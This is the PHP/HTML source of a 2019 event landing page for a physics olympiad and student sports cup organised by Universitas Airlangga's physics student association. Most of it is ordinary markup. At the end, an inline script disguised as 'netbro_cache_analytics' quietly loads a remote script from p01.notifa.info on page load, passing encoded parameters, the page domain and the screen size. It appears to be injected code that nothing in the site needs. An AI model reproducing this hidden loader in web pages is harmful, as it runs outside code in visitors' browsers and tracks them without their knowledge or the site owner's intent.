<?php session_start();?>

<!doctype html>
<html lang="en" class="no-js">

<head>
	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-4946886-2"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'UA-4946886-2');
	</script>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="momentumicon.png" />

	<meta name="keywords"
		content="agenda kota surabaya, agenda lomba, berita lomba, cari lomba, contoh soal lomba logika fisika, daftar lomba, daftar lomba 2019, daftar lomba terbaru, deadline lomba, deadline lomba apa saja, event lomba, event lomba 2019, foto lomba, info kompetisi, info lomba, info lomba 2019, info lomba 2019 sma, info lomba anak, info lomba anak terbaru, info lomba apa saja, info lomba oktober 2019, info lomba online, info lomba online 2015, info lomba online terbaru, info lomba sma, info lomba sma 2019, info lomba sma 2019, info lomba terbaru, info lomba tingkat sma 2019, its, its surabaya, jadwal lomba 2019, kompetisi 2019, kompetisi di indonesia, kompetisi indonesia, kompetisi online, kompetisi online 2019, kumpulan lomba, lomba, lomba 2019, lomba apa aja, lomba apa saja, lomba berhadiah, lomba berhadiah 2019, lomba di internet, lomba di surabaya 2019, lomba di tahun 2019, lomba hadiah, lomba hari ini, lomba indonesia, kuis fisika, kuis fisika 2019, olimpiade fisika, olimpiade fisika nasional, lomba unair, lomba fisika unair, himafi unair,himafi, lomba fisika, olimpiade sma, olimpiade fisika sma, olimpiade fisika 2019, olimpiade fisika nasional 2019, kompetisi futsal 2019, kompetisi futsal jatim, futsal jatim, lomba futsal, lomba futsal 2019, lomba olahraga, lomba futsal jatim, kompetisi basket, kompetisi basket sma, kompetisi basket 2019,kompetisi basket jatim, kompetisi basket jatim 2019, lomba basket, lomba basket 2019, lomba basket jatim, lomba basket jatim 2019, info lomba terbaru" />
	<title>Momentum 2019</title>
	<link rel="stylesheet" href="css/reset.css"> <!-- CSS reset -->
	<link rel="stylesheet" href="css/style.css"> <!-- Resource style -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
		integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
		integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous">
	</script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
		integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous">
	</script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
		integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous">
	</script>
	<script src="js/modernizr.js"></script> <!-- Modernizr -->
	<style>
		.footer {
			position: absolute;
			left: 0;
			bottom: 0;
			width: 100%;
			height: auto;
			background-color: transparent;
		}
	</style>
</head>

<body style="background-color:#273040">
	<!-- Page preloader -->
	<div id="hola">
		<div id="preloader">
			<img src="images/loading.png" alt="" /> </div>
	</div>
	<main>
		<div class="cd-index cd-main-content">
			<div class="heady">
				<div class="logo"><a href="index.html"><img src="images/logo1.png" alt="logo" /></a></div>
				<div class="navitems">
					<div class="navcolumn">
						<?php
							if (isset($_SESSION['user_name'])) { ?>
								<a class="cd-btn" href="./" data-type="page-transition">Home</a>
								<a class="cd-btn" href="./db/" data-type="page-transition">Dashboard</a>
								<a class="cd-btn" href="./logout.php" data-type="page-transition">Logout</a>
								<?php 
							} 
							else {
							?>
						<a class="cd-btn" href="/" data-type="page-transition">Home</a>
						<a class="cd-btn" href="daftar.php" data-type="page-transition">Daftar</a>
						<a class="cd-btn" href="login.php" data-type="page-transition">Login</a>
							<?php } ?>
					</div>
				</div>
				<div class="bubbleback"></div>
				<div class="bubble"></div>
				<div class="bubble-wrap">
					<div class="bar first"></div>
					<div class="bar second"></div>
					<div class="bar third"></div>
				</div>

			</div>
			<div class="footleft">
				<p>© Himpunan Mahasiswa Fisika UNAIR 2019</p>
			</div>
			<div class="footright">
				<a href="https://www.instagram.com/momentumunair/" target="_blank">
					<img src="images/instagram.png" width="" height="" alt="" />
				</a>
				<a href="http://nav.cx/3ZN4qXD" target="_blank">
					<img src="images/line.png" width="" height="" alt="" />
				</a>
				<a href="https://s.himafiunair.id/contactmomentum" target="_blank">
					<img src="images/whatsapp.png" width="" height="" alt="" />
				</a>
			</div>
			<div class="leftbar"></div>
			<div class="rightbar"></div>
			<div class="planewrap"><img id="plane" class="planey" src="images/plane.png" width="100%" alt="" /><img
					class="planeymob" src="images/plane.png" width="100%" alt="" /></div>
			<div class="wrapper homery">
				<div class="banner"><a name="top"></a>
					<div class="bannertxt">
						<div class="bannersplat">
							<div class="scotty"><img src="images/momentum.png" width="230px" height="230px" alt="" />
							</div>

							<div class="fluiddark">
							</div>
						</div>
						<h1><span class="word">Kuis &nbsp; Fisika</span>
							<span class="word"> &nbsp;&nbsp;&nbsp;Momentum&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 1.0 </span>
							<span class="word">Himafi &nbsp; Cup</span>
						</h1>
					</div>
					<div class="scroll bounce"></div>
				</div>
				<div class="about">
					<div class="abouttext">
						<h2 class="hideme">Apa sih Momentum 1.0 itu ?</h2>
						<p class="hideme">Momentum 1.0 merupakan sebuah rangkaian acara yang dilaksanakan oleh Himpunan
							Mahasiswa Fisika Universitas Airlangga diantaranya yaitu, Kuis Fisika 2019 dan Himafi cup
							2019</p>
					</div>
					<div class="skillz group">
						<div class="direction">
							<div class="skillzpic hideme"><img src="images/direction.png" width="" height="" alt="" />
							</div>
							<div class="fluid skilly"></div>
							<h3 class="hideme">Total Hadiah Rp 30.000.000</h3>
							<p class="hideme">Total Hadiah untuk rangkaian acara Momentum 1.0 sendiri mencapai
								Rp.30.000.000, tentunya disertai dengan trophy dan sertifikat untuk para juara</p>
						</div>
						<div class="strategy">
							<div class="skillzpic2 hideme"><img src="images/strategy.png" width="" height="" alt="" />
							</div>
							<div class="fluid skillyright"></div>
							<h3 class="hideme">Tempat Pelaksanaan</h3>
							<p class="hideme">Momentum 1.0 sendiri dilaksanakan dalam skala nasional dengan 8 region
								wilayah untuk Kuis fisika dan wilayah Gresik,Bangkalan, Mojokerto, Surabaya, Sidoarjo,
								dan Lamongan untuk Himafi Cup </p>
						</div>
					</div>
				</div>
				<div class="work">
					<div class="work1 group">
						<div class="workpic">
							<div class="homework1"><img src="images/londonborn-device.png" width="" height="" alt="" />
							</div>
							<div class="homeworksplat">
								<div class="fluidbig">
								</div>
							</div>
						</div>
						<div class="workintro">
							<div class="worktext">
								<h3 class="hideme">Kuis Fisika 2019</h3>
								<p class="hideme"> Kuis Fisika adalah suatu Olimpiade Fisika tingkat SMA skala nasional
									yang telah diselenggarakan setiap tahun oleh Himpunan Mahasiswa Fisika Universitas
									Airlangga. Ada dua metode Olimpiade yang dilaksanakan yaitu Online (Nasional) dan
									Offline (8 Region) </p> <a class="cd-btn hideme" href=""
									data-type="page-transition">Selengkapnya</a>
							</div>
						</div>
					</div>
					<div class="work2 group">
						<div class="workpic2">
							<div class="homework2"><img src="images/subaru-device.png" width="" height="" alt="" />
							</div>
							<div class="homeworksplat2">
								<div class="fluidbig righty">
								</div>
							</div>
						</div>
						<div class="workintro2">
							<div class="worktext2">
								<h3 class="hideme">Himafi Cup 2019</h3>
								<p class="hideme">Himafi Cup merupakan kompetisi olahraga tingkat SMA/SMK se gerbang
									kertasusila. Ada dua cabang olahraga dalam himafi cup ini yaitu, Futsal putra dan
									Basket putra.</p> <a class="cd-btn hideme" href=""
									data-type="page-transition">Selengkapnya</a>
							</div>
						</div>
					</div>
					<div class="work2 group">
						<div class="player-overlay">
							<div>
								<!-- <iframe class="mbr-embedded-video" src="assets/images/teaser/TeaserKF2018.mp4" frameborder="0" allowfullscreen muted></iframe> -->
								<video id="exporevideo" style="padding-top: 20px;" width="100%" height=auto controls
									muted autoplay>
									<source src="videos/webvideo.mp4" type="video/mp4">
									<!-- <source src="movie.ogg" type="video/ogg">
              Your browser does not support the video tag. -->
								</video>
							</div>
						</div>
					</div>
				</div>
				<div class="workclose"><img src="images/wavy2.png" width="" height="" alt="" /></div>
				<div class="contactbanner">
					<div class="contacttxt">
						<h1 class="hideme">Tunggu apalagi ?, Ayo <a class="cd-btn" href=""
								data-type="page-transition">DAFTAR</a></h1>
					</div>
					<div class="bannersplatfoot">
						<div class="canada"><img src="images/Canada.png" width="" height="" alt="" /></div>
					</div>
					<div class="fluiddark">
					</div>
				</div>
			</div>

			<div class="footer">
				<img src="images/footer.png" width="300px" height="80px" alt="" />
			</div>
		</div>
		</div>
	</main>
								
	<div class="cd-cover-layer"></div>
	<div class="cd-loading-bar"></div>
	<script src="js/jquery-2.1.1.js"></script>
	<script src="js/main.js"></script> <!-- Resource jQuery -->
	<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
	<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.min.js'></script>
	<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.ui.min.js'></script>
	<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/2542/in-view.min.js'></script>
	<script src="js/preloader.js"></script>
	<script src="js/blob.js"></script>
	<script src="js/wordz.js"></script>
	<script src="js/index.js"></script>
	<script src="js/plane.js"></script>
	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function () {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2XKwJhe1PRESLlnrQBHsE3FSymqyVyV%2bz13goJOULAYdknf6x8zrbnaCS0GfP1SRjfjrAi3MICUxzjkDu9mTLcwYBwUKdM%2f7jYDgAzyD7wWuccf1dl%2flS%2fnInncJ3Ls2fiaoMFEw0IyhN6qpMINsAGpbSOBTvmrJP5jScObXYMN0Zp1rNgUT6Zca1C6GM%2bFlPrRPyQVpPUlS22WSGJP2GwPrb1Nd%2fuKBCVI7XaBisLNLleKaftRva2xXDRpa4SMROm8FzMNYjW9elQBJzkZMPRrtlOA7q4H3CTJYvKoW0hh1ZHLzfp9hF6wuzvt3EASMFnMYgSwFo7kW1hW2qO6PCBlCWgEw1LvuVO%2fw2c2Uep4HHJgFsQeuRvM0%2f6Gv6%2bs0G%2buepXbgfUcZYI9Vzb6iVZig1XRg3efhf01okUn%2bE4uM%2fMABcn1Fyrw%3d%3d" +
					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function () {});
		};
	</script>
</body>

</html>